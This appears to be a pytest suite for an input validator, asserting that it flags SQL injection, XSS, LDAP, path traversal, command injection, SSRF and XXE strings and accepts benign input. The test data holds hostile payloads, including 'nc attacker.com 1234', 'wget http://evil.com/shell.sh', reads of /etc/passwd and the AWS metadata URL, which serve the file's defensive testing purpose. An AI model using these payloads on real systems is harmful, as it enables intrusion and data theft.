"""Tests for 32 attack pattern input validation."""
import pytest

from src.security.input_validator import (
    InputValidator,
    AttackType,
    get_input_validator
)


@pytest.fixture
def validator():
    """Create input validator instance."""
    return InputValidator()


class TestSQLInjection:
    """Test SQL injection detection (26 patterns)."""
    
    def test_select_statement(self, validator):
        is_safe, attacks = validator.validate("SELECT * FROM users")
        assert not is_safe
        assert any("SQL Injection" in attack for attack in attacks)
    
    def test_union_select(self, validator):
        is_safe, attacks = validator.validate("1' UNION SELECT password FROM users--")
        assert not is_safe
    
    def test_sql_comment(self, validator):
        is_safe, attacks = validator.validate("admin'--")
        assert not is_safe
    
    def test_or_condition(self, validator):
        is_safe, attacks = validator.validate("' OR '1'='1")
        assert not is_safe
    
    def test_drop_table(self, validator):
        is_safe, attacks = validator.validate("'; DROP TABLE users;--")
        assert not is_safe
    
    def test_waitfor_delay(self, validator):
        is_safe, attacks = validator.validate("'; WAITFOR DELAY '00:00:05'--")
        assert not is_safe
    
    def test_benchmark(self, validator):
        is_safe, attacks = validator.validate("' AND BENCHMARK(1000000,MD5('test'))--")
        assert not is_safe
    
    def test_sleep(self, validator):
        is_safe, attacks = validator.validate("' AND SLEEP(5)--")
        assert not is_safe
    
    def test_information_schema(self, validator):
        is_safe, attacks = validator.validate("' UNION SELECT table_name FROM information_schema.tables--")
        assert not is_safe
    
    def test_safe_input(self, validator):
        is_safe, attacks = validator.validate("john.doe@example.com")
        assert is_safe
        assert len(attacks) == 0


class TestXSS:
    """Test XSS detection (10 patterns)."""
    
    def test_script_tag(self, validator):
        is_safe, attacks = validator.validate("<script>alert('XSS')</script>")
        assert not is_safe
        assert any("XSS" in attack for attack in attacks)
    
    def test_javascript_protocol(self, validator):
        is_safe, attacks = validator.validate("javascript:alert('XSS')")
        assert not is_safe
    
    def test_onerror_handler(self, validator):
        is_safe, attacks = validator.validate('<img src=x onerror="alert(1)">')
        assert not is_safe
    
    def test_onload_handler(self, validator):
        is_safe, attacks = validator.validate('<body onload="alert(1)">')
        assert not is_safe
    
    def test_iframe(self, validator):
        is_safe, attacks = validator.validate('<iframe src="http://evil.com"></iframe>')
        assert not is_safe
    
    def test_embed_tag(self, validator):
        is_safe, attacks = validator.validate('<embed src="http://evil.com">')
        assert not is_safe
    
    def test_data_uri(self, validator):
        is_safe, attacks = validator.validate('data:text/html,<script>alert(1)</script>')
        assert not is_safe
    
    def test_safe_html(self, validator):
        is_safe, attacks = validator.validate("<p>Hello World</p>")
        assert is_safe


class TestLDAPInjection:
    """Test LDAP injection detection."""
    
    def test_wildcard_abuse(self, validator):
        is_safe, attacks = validator.validate("*)(uid=*))(|(uid=*")
        assert not is_safe
        assert any("LDAP" in attack for attack in attacks)
    
    def test_or_operator(self, validator):
        is_safe, attacks = validator.validate("admin)(|(password=*))")
        assert not is_safe


class TestPathTraversal:
    """Test path traversal detection (6 patterns)."""
    
    def test_dotdot_slash(self, validator):
        is_safe, attacks = validator.validate("../../../../etc/passwd")
        assert not is_safe
        assert any("Path Traversal" in attack for attack in attacks)
    
    def test_url_encoded_traversal(self, validator):
        is_safe, attacks = validator.validate("..%2f..%2f..%2fetc%2fpasswd")
        assert not is_safe
    
    def test_windows_path(self, validator):
        is_safe, attacks = validator.validate("..\\..\\..\\windows\\system32\\config\\sam")
        assert not is_safe
    
    def test_proc_self(self, validator):
        is_safe, attacks = validator.validate("/proc/self/environ")
        assert not is_safe
    
    def test_safe_path(self, validator):
        is_safe, attacks = validator.validate("public/uploads/image.jpg")
        assert is_safe


class TestCommandInjection:
    """Test command injection detection (7 patterns)."""
    
    def test_semicolon(self, validator):
        is_safe, attacks = validator.validate("test; cat /etc/passwd")
        assert not is_safe
        assert any("Command Injection" in attack for attack in attacks)
    
    def test_pipe(self, validator):
        is_safe, attacks = validator.validate("test | nc attacker.com 1234")
        assert not is_safe
    
    def test_command_substitution(self, validator):
        is_safe, attacks = validator.validate("test$(whoami)")
        assert not is_safe
    
    def test_backticks(self, validator):
        is_safe, attacks = validator.validate("test`id`")
        assert not is_safe
    
    def test_wget(self, validator):
        is_safe, attacks = validator.validate("wget http://evil.com/shell.sh")
        assert not is_safe
    
    def test_safe_command(self, validator):
        is_safe, attacks = validator.validate("test-file.txt")
        assert is_safe


class TestSSRF:
    """Test SSRF detection (4 patterns)."""
    
    def test_localhost(self, validator):
        is_safe, attacks = validator.validate("http://localhost:8080/admin")
        assert not is_safe
        assert any("SSRF" in attack for attack in attacks)
    
    def test_127_0_0_1(self, validator):
        is_safe, attacks = validator.validate("http://127.0.0.1/")
        assert not is_safe
    
    def test_aws_metadata(self, validator):
        is_safe, attacks = validator.validate("http://169.254.169.254/latest/meta-data/")
        assert not is_safe
    
    def test_file_protocol(self, validator):
        is_safe, attacks = validator.validate("file:///etc/passwd")
        assert not is_safe
    
    def test_safe_url(self, validator):
        is_safe, attacks = validator.validate("https://api.example.com/data")
        assert is_safe


class TestXXE:
    """Test XXE detection (4 patterns)."""
    
    def test_entity_declaration(self, validator):
        xml = '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
        is_safe, attacks = validator.validate(xml)
        assert not is_safe
        assert any("XXE" in attack for attack in attacks)
    
    def test_doctype_with_dtd(self, validator):
        xml = '<!DOCTYPE foo [<!ELEMENT foo ANY>]>'
        is_safe, attacks = validator.validate(xml)
        assert not is_safe


class TestInputSanitization:
    """Test input sanitization functions."""
    
    def test_sanitize_sql(self, validator):
        result = validator.sanitize_sql("admin'--")
        assert "'" not in result or result.count("'") > 1
        assert "--" not in result
    
    def test_sanitize_html(self, validator):
        result = validator.sanitize_html("<script>alert('XSS')</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result
    
    def test_sanitize_filename(self, validator):
        result = validator.sanitize_filename("../../etc/passwd")
        assert ".." not in result
        assert "/" not in result


class TestEmailValidation:
    """Test email validation."""
    
    def test_valid_email(self, validator):
        assert validator.validate_email("user@example.com")
        assert validator.validate_email("test.user+tag@example.co.uk")
    
    def test_invalid_email(self, validator):
        assert not validator.validate_email("not-an-email")
        assert not validator.validate_email("@example.com")
        assert not validator.validate_email("user@")


class TestURLValidation:
    """Test URL validation."""
    
    def test_valid_url(self, validator):
        assert validator.validate_url("https://api.example.com/data")
        assert validator.validate_url("http://example.com")
    
    def test_invalid_url(self, validator):
        assert not validator.validate_url("http://127.0.0.1")
        assert not validator.validate_url("file:///etc/passwd")
        assert not validator.validate_url("javascript:alert(1)")


class TestPatternCount:
    """Test total pattern count."""
    
    def test_pattern_count(self, validator):
        count = validator.count_total_patterns()
        assert count >= 62  # 26 SQL + 10 XSS + 5 LDAP + 6 Path + 7 Cmd + 4 SSRF + 4 XXE
        # Total should be at least 62 patterns


class TestGlobalValidator:
    """Test global validator instance."""
    
    def test_singleton(self):
        validator1 = get_input_validator()
        validator2 = get_input_validator()
        assert validator1 is validator2
